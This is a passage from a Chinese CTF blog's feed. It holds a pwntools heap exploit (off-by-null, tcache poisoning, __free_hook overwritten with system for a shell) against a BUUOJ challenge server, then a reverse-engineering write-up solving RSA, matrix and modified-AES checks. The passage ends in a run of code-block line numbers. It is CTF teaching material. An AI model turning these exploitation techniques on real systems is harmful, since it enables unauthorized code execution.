class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./ciscn_s_1&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27352</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;4.show\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">    heap_addr = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> heap_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;4.show\n&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;4.show\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;4.show\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">key2_addr = <span class="number">0x6022B8</span></span><br><span class="line"><span class="comment"># chunk overlapping 改 key1 key2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf8</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0xf8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xa8</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0xf8</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0xf8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>+p64(<span class="number">0x2b0</span>)<span class="comment">#前面堆块大小之和</span></span><br><span class="line">edit(<span class="number">9</span>,payload)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf8</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0xf8</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xf8</span>,p64(key2_addr))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0xf8</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="number">0xf8</span>,p32(<span class="number">1</span>)+p32(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-null double free</span></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x421</span>-<span class="number">0x10</span></span><br><span class="line">lbase = malloc_hook-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">free_hook = lbase+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = lbase+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(lbase))</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(r)[0])</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">17</span>,<span class="number">0xa8</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">17</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">18</span>,<span class="number">0xa8</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">19</span>,<span class="number">0xa8</span>,<span class="string">&#x27;junk&#x27;</span>)</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0xa8</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;复习下 off-by-null&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
    <category term="pwn" scheme="https://www.0wl.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2022DASCTFxSU三月春季赛login wp</title>
    <link href="https://www.0wl.site/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/"/>
    <id>https://www.0wl.site/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/</id>
    <published>2022-04-02T09:41:59.000Z</published>
    <updated>2022-04-03T13:52:03.598Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>这题好像是 re 的那道 0 解题，赛后自己拿到附件做了一下</p></div></article><span id="more"></span><h2 id="大致分析">大致分析</h2><ul><li>题目给了两个附件 <code>login</code> 和 <code>check</code> ，<code>login</code> 相当于客户端而 <code>check</code> 相当于服务端进行校验</li></ul><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/image-20220402175656151.png" class=""><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/image-20220402175712446.png" class=""><ul><li>程序是静态编译的去除了符号信息，为了方便后续分析可以使用 <code>ida</code> 插件 <a href="https://github.com/aliyunav/Finger">Finger</a> 来<strong>识别库函数</strong>（结果不一定准确，需要看一下函数内容）</li><li><code>login</code> 和 <code>check</code> 两个进程通过 <code>socket</code> 进行通信，下面列出一些 <code>socket</code> 通信的函数的声明及作用</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"><span class="comment">//create an endpoint for communication</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="comment">//listen for connections on a socket</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="comment">//initiate a connection on a socket</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"><span class="comment">//accept jobs sent to a destination</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="comment">//bind a name to a socket</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendto</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">const</span> struct sockaddr *dest_addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvfrom</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">                        struct sockaddr *src_addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>recvfrom</code> 接收到输入的 <code>token</code> 和 <code>password</code>，只有在 <code>token</code> 和 <code>password</code> 都校验通过的时候才会 <code>check flag</code></li></ul><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/image-20220402200136476.png" class=""><h2 id="check-Token">check Token</h2><ul><li><code>gmpz</code> 是一个大数计算库，这里可以看出进行了 <code>c^e%n</code> 的运算（就是 RSA）,如果没有识别函数这里也可以通过数字 <code>0x10001</code> 和 大数猜测出是 <code>RSA</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mpz_powm</span> <span class="params">(mpz_ptr r, mpz_srcptr b, mpz_srcptr e, mpz_srcptr m)</span></span>;</span><br><span class="line"><span class="comment">/*mpz_powm(res,base,exp,mod) -- Set R to (U^E) mod M.*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mpz_init_set_str</span> <span class="params">(mpz_ptr x, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">int</span> base)</span></span>;</span><br><span class="line"><span class="comment">/*mpz_init_set_str(string, base) -- Convert the \0-terminated string STRING in</span></span><br><span class="line"><span class="comment">   base BASE to a multiple precision integer.  Allow white space in the string.</span></span><br><span class="line"><span class="comment">   If BASE == 0 determine the base in the C standard way, i.e.  0xhh...h means</span></span><br><span class="line"><span class="comment">   base 16, 0oo...o means base 8, otherwise assume base 10.*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mpz_cmp</span> <span class="params">(mpz_srcptr u, mpz_srcptr v)</span></span></span><br><span class="line"><span class="function"><span class="comment">/*mpz_cmp(u,v) -- Compare U, V.  Return positive, zero, or negative</span></span></span><br><span class="line"><span class="function"><span class="comment">   based on if U &gt; V, U == V, or U &lt; V.*/</span></span></span><br></pre></td></tr></table></figure><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/image-20220402200413888.png" class=""><ul><li>用 <code>Rsatools</code> 解一下</li></ul><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/image-20220402182255180.png" class=""><h2 id="check-Password">check Password</h2><ul><li>一个矩阵运算，通过 <code>sage</code> 求解，<code>random</code> 得到的值可以自己写一个跑出结果（没有 <code>srand</code>）</li></ul><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/image-20220402201224475.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#BX=A</span></span><br><span class="line">B=Matrix(Zmod(<span class="number">257</span>),[[<span class="number">113</span>,<span class="number">219</span>,<span class="number">37</span>,<span class="number">46</span>,<span class="number">122</span>,<span class="number">15</span>],[<span class="number">76</span>,<span class="number">163</span>,<span class="number">106</span>,<span class="number">34</span>,<span class="number">170</span>,<span class="number">41</span>],[<span class="number">110</span>,<span class="number">27</span>,<span class="number">169</span>,<span class="number">122</span>,<span class="number">138</span>,<span class="number">39</span>],[<span class="number">47</span>,<span class="number">128</span>,<span class="number">240</span>,<span class="number">14</span>,<span class="number">170</span>,<span class="number">86</span>],[<span class="number">247</span>,<span class="number">89</span>,<span class="number">88</span>,<span class="number">0</span>,<span class="number">169</span>,<span class="number">242</span>],[<span class="number">246</span>,<span class="number">154</span>,<span class="number">78</span>,<span class="number">28</span>,<span class="number">72</span>,<span class="number">201</span>]])</span><br><span class="line"></span><br><span class="line">A=Matrix(Zmod(<span class="number">257</span>),[[<span class="number">0xa3</span>, <span class="number">0x97</span>, <span class="number">0xa2</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0xbe</span>],[<span class="number">0xf1</span>, <span class="number">0xfc</span>, <span class="number">0xf9</span>, <span class="number">0x79</span>, <span class="number">0x6b</span>, <span class="number">0x52</span>], [<span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0xe9</span>, <span class="number">0xe2</span>, <span class="number">0x2d</span>, <span class="number">0x51</span>], [<span class="number">0x8e</span>, <span class="number">0x1f</span>, <span class="number">0x56</span>, <span class="number">0x8</span>, <span class="number">0x57</span>, <span class="number">0x27</span>], [<span class="number">0xa7</span>, <span class="number">0x5</span>, <span class="number">0xd4</span>, <span class="number">0xd0</span>, <span class="number">0x52</span>, <span class="number">0x82</span>], [<span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x1b</span>, <span class="number">0x99</span>, <span class="number">0x4a</span>,<span class="number">0xed</span>]])</span><br><span class="line"></span><br><span class="line">pwd=B.solve_right(A)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[ 81  50 210   2 195  45]</span></span><br><span class="line"><span class="string">[149 185 249 120 213  20]</span></span><br><span class="line"><span class="string">[227  41  66  32  81  59]</span></span><br><span class="line"><span class="string">[ 21  98  52 130 180 192]</span></span><br><span class="line"><span class="string">[ 46 154 253 232 186 213]</span></span><br><span class="line"><span class="string">[236   7  72 106  84 136]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;%02x&quot;</span> %j)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="check-Flag">check Flag</h2><ul><li>可以明显看出通过 <code>token</code> 和 <code>password</code> 检查后的第一个 <code>recvfrom</code> 获取的值不是最后输入 <code>flag</code>，转而分析 <code>login</code>，在 <code>login</code> 中</li></ul><p>发现发送了一串 16 进制字符串，可以看出是 <code>AES</code> 加密的逆盒</p><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/image-20220402201836169.png" class=""><ul><li>正确的 <code>token</code> 和 <code>pwd</code> 重新组合作为 <code>AES</code> 加密的 <code>key</code>，这里的 <code>AES</code> 是魔改过的所以还需要继续分析</li></ul><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/image-20220402202032560.png" class=""><ul><li>与标准的 <code>AES</code> 进行对照，发现多了个 <code>xor</code> 操作还有把 <code>sub_bytes</code> 替换成了 <code>inv_sub_bytes</code></li></ul><img src="/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/image-20220402202651635.png" class=""><ul><li>整个脚本就不贴了，参考的模板是 <a href="https://github.com/dhuertas/AES">https://github.com/dhuertas/AES</a></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span 